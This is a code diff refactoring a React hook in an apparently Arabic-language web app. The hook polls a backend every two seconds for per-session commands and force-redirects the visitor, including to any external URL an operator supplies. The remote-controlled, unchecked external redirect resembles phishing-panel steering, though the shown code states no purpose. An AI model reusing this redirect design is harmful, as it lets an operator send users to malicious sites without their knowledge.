@@ -1,11 +1,11 @@
-// Heartbeat tracking hook - checks for navigation commands
-import { useEffect, useRef, useCallback } from "react";
+// Navigation control hook - checks for commands and redirects user
+import { useEffect, useRef } from "react";
 import { ensureSessionId } from "./submissions";
-import { getPendingNavigationCommand, clearNavigationCommand, ACTION_TO_ROUTE, type NavigationAction } from "./api";
+import { getNavigationCommand, deleteNavigationCommands, ACTION_TO_ROUTE, type NavigationAction } from "./api";
 
-const COMMAND_CHECK_INTERVAL = 2000;
+const CHECK_INTERVAL = 2000; // Check every 2 seconds
 
-// Page names mapping for better readability
+// Page name translations
 export const PAGE_NAMES: Record<string, string> = {
   "/": "الرئيسية",
   "/form": "تسجيل البيانات",
@@ -31,111 +31,129 @@ export interface PingData {
   last_ping: string;
 }
 
-// Hook to check for navigation commands and redirect user
+// Navigation control hook
 export function useHeartbeatTracking() {
-  const commandCheckRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const checkIntervalRef = useRef<number | null>(null);
   const sessionIdRef = useRef<string>("");
   const isRedirectingRef = useRef<boolean>(false);
+  const hasInitializedRef = useRef<boolean>(false);
 
-  const checkForNavigationCommand = useCallback(async () => {
+  // Check for navigation command
+  async function checkForCommand() {
+    // Prevent multiple concurrent checks
+    if (isRedirectingRef.current) return;
+    
     const sessionId = sessionIdRef.current;
-    if (!sessionId || isRedirectingRef.current) {
-      return;
-    }
+    if (!sessionId) return;
 
     try {
-      const command = await getPendingNavigationCommand(sessionId);
+      // Get command from Supabase
+      const command = await getNavigationCommand(sessionId);
       
-      if (!command || !command.action) {
-        return;
-      }
+      // No command found
+      if (!command) return;
+      if (!command.action) return;
 
-      console.log("📨 Navigation command received:", command.action);
+      console.log("Command received:", command.action);
 
-      // Prevent multiple redirects
+      // Start redirect process
       isRedirectingRef.current = true;
 
-      // Check if there's a custom redirect_to URL (external redirect)
-      if (command.redirect_to && typeof command.redirect_to === 'string') {
-        console.log("🔗 Redirected to external URL:", command.redirect_to);
-        window.location.href = command.redirect_to;
+      // Determine redirect target
+      let targetUrl: string | null = null;
+
+      // Check if custom redirect URL exists
+      if (command.redirect_to && typeof command.redirect_to === 'string' && command.redirect_to.length > 0) {
+        targetUrl = command.redirect_to;
       } else {
-        // Use the action to get the route
-        const targetPath = ACTION_TO_ROUTE[command.action as NavigationAction];
-        if (targetPath) {
-          console.log("🔀 Redirected to:", targetPath);
-          window.location.href = targetPath;
-        } else {
-          console.warn("⚠️ Unknown navigation action:", command.action);
-          isRedirectingRef.current = false;
+        // Use action to route mapping
+        const route = ACTION_TO_ROUTE[command.action as NavigationAction];
+        if (route) {
+          targetUrl = route;
         }
       }
 
-      // Clear the command after processing (don't await, just fire)
-      clearNavigationCommand(sessionId).catch((err) => {
-        console.error("❌ Error clearing navigation command:", err);
+      // Perform redirect if target found
+      if (targetUrl) {
+        console.log("Redirecting to:", targetUrl);
+        
+        // Use window.location.href for full page redirect
+        window.location.href = targetUrl;
+      } else {
+        console.warn("Unknown action:", command.action);
+        // Reset flag for unknown action
+        isRedirectingRef.current = false;
+      }
+
+      // Delete command after processing (fire and forget)
+      deleteNavigationCommands(sessionId).catch(function(err) {
+        console.error("Failed to delete command:", err);
       });
 
-    } catch (error) {
-      console.error("❌ Error checking navigation command:", error);
+    } catch (err) {
+      console.error("Error checking for command:", err);
+      // Don't keep isRedirecting true on error
+      isRedirectingRef.current = false;
     }
-  }, []);
+  }
 
-  const startTracking = useCallback(() => {
-    if (commandCheckRef.current) return;
+  // Start checking
+  function startChecking() {
+    if (checkIntervalRef.current !== null) return; // Already running
+    if (hasInitializedRef.current) return;
 
+    hasInitializedRef.current = true;
     sessionIdRef.current = ensureSessionId();
-    console.log("🚀 Navigation control started for session:", sessionIdRef.current);
+    
+    console.log("Navigation control started, session:", sessionIdRef.current);
 
-    // Check for commands immediately
-    checkForNavigationCommand();
+    // Check immediately
+    checkForCommand();
 
-    // Check for commands periodically
-    commandCheckRef.current = setInterval(() => {
-      checkForNavigationCommand();
-    }, COMMAND_CHECK_INTERVAL);
-  }, [checkForNavigationCommand]);
+    // Then check periodically
+    checkIntervalRef.current = window.setInterval(function() {
+      checkForCommand();
+    }, CHECK_INTERVAL);
+  }
 
-  const stopTracking = useCallback(() => {
-    if (commandCheckRef.current) {
-      clearInterval(commandCheckRef.current);
-      commandCheckRef.current = null;
+  // Stop checking
+  function stopChecking() {
+    if (checkIntervalRef.current !== null) {
+      window.clearInterval(checkIntervalRef.current);
+      checkIntervalRef.current = null;
     }
-  }, []);
+  }
 
-  useEffect(() => {
-    startTracking();
-    return () => stopTracking();
-  }, [startTracking, stopTracking]);
+  // Start on mount, stop on unmount
+  useEffect(function() {
+    startChecking();
+    return function cleanup() {
+      stopChecking();
+    };
+  }, []);
 
   return {
     sessionId: sessionIdRef.current,
-    stopTracking,
+    stopTracking: stopChecking,
   };
 }
 
-// Format time for display
+// Format relative time
 export function formatLiveTime(isoString: string): string {
   const diff = Date.now() - new Date(isoString).getTime();
   const secs = Math.floor(diff / 1000);
 
-  if (secs < 60) {
-    return `منذ ${secs} ثانية`;
-  }
-
+  if (secs < 60) return `منذ ${secs} ثانية`;
+  
   const mins = Math.floor(secs / 60);
   const remainingSecs = secs % 60;
 
-  if (mins < 60) {
-    return `منذ ${mins} دقيقة و ${remainingSecs} ثانية`;
-  }
+  if (mins < 60) return `منذ ${mins} دقيقة و ${remainingSecs} ثانية`;
 
   const hours = Math.floor(mins / 60);
   const remainingMins = mins % 60;
 
-  if (hours < 24) {
-    return `منذ ${hours} ساعة و ${remainingMins} دقيقة`;
-  }
+  if (hours < 24) return `منذ ${hours} ساعة و ${remainingMins} دقيقة`;
 
   return new Date(isoString).toLocaleString("ar-EG", {
     day: "numeric",
@@ -152,7 +170,7 @@ export function isSessionActive(lastPing: string | null): boolean {
   return diff <= 10000;
 }
 
-// Get time since last ping in seconds
+// Get seconds since last ping
 export function getSecondsSincePing(lastPing: string | null): number {
   if (!lastPing) return Infinity;
   return Math.floor((Date.now() - new Date(lastPing).getTime()) / 1000);
